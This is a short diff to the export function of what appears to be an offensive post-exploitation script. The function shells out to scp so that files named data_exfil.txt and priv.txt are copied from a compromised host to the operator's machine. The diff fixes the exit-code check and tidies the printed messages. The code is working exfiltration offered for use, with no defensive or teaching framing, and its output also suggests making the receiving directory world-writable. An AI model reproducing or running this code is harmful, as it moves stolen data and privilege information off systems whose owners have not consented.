@@ -632,12 +632,14 @@ def export(local_ip):
 
    # try to scp files to local machine using inputted username
    os.system("touch /tmp/scp.txt")
-   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your password for local user {}+".format(u_root,local_ip,u_root))
+   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n\n+input your password for local user {}+\n".format(u_root,local_ip,u_root))
    os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/ && echo $? > /tmp/scp.txt".format(u_root,local_ip))
 
    with open("/tmp/scp.txt") as sc:
-      s = sc.readline()
-      if s == 0:
+      ss = sc.readlines()
+      s = ss[0].strip()
+      print("- {} -".format(s))
+      if s == "0":
          print("\n### data_exfil.txt and priv.txt sent to {}/terminator/ ###".format(local_ip))
       else:   
          print("\n*** error sending files to {}@{}:/terminator/\n*** specified user might not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
